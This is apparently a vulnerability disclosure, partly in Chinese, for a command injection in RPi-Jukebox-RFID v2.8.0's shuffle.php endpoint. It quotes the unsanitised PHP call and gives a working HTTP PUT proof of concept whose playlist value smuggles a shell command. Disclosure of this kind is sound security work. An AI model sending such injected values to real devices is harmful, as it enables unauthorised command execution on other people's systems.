# RCE vulnerability in [RPi-Jukebox-RFID](https://github.com/MiczFlor/RPi-Jukebox-RFID) v2.8.0 of file /shuffle.php

**vender**:

- [MiczFlor/RPi-Jukebox-RFID: A Raspberry Pi jukebox, playing local music, podcasts, web radio and streams triggered by RFID cards, web app or home automation. All plug and play via USB. GPIO scripts available.](https://github.com/MiczFlor/RPi-Jukebox-RFID)

**SoftLink**:

- [Release v2.8.0: Fix Spotify Authentication · MiczFlor/RPi-Jukebox-RFID](https://github.com/MiczFlor/RPi-Jukebox-RFID/releases/tag/v2.8.0)

**Vulnerable File**

- /htdocs/api/playlist/shuffle.php

**Version**

- 2.8.0

### Analyse

对于 `shuffle.php`：

```php
// 在 shuffle.php 中
$playlist = $json['playlist'];
$shuffle = $json['shuffle'];
if ($shuffle === 'true') {
    execScript("shuffle_play.sh -c=enableshuffle -d='{$playlist}'");
} else {
    execScript("shuffle_play.sh -c=disableshuffle -d='{$playlist}'");
}
```

 `validateRequest()` 函数只检查 `playlist` 和 `single`/`shuffle` 字段是否存在，但没有检查其内容。

```http
PUT /api/playlist/shuffle.php HTTP/1.1
Host: 192.168.129.130
Content-Type: application/json
Content-Length: 69

{
  "playlist": "test';id>3.txt;echo '123",
  "shuffle": "true"
}
```

![image-20250828231146397](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508282311450.png)



![image-20250828231330086](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508282313162.png)